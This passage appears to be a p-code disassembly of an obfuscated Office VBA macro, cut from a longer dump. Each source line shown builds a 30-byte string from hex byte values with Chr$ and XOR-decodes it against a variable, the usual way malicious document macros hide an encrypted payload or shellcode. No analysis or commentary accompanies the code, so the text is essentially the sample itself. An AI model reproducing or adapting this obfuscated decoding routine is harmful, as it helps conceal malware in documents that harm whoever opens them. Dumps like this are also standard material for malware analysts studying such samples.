' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0080 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #94:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #95:
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x003B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0099 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #96:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #97:
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0083 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #98:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #99:
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0089 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #100:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #101:
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0098 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00ED 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #102:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #103:
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0083 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #104:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #105:
' 	LitDI2 0x00CC 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0025 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0060 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00ED 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #106:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #107:
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DD 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0097 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0071 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #108:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #109:
' 	LitDI2 0x0091 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00ED 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0087 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #110:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #111:
' 	LitDI2 0x00AE 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0088 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0017 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #112:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #113:
' 	LitDI2 0x00CF 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00ED 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A7 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B6 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #114:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #115:
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002D 
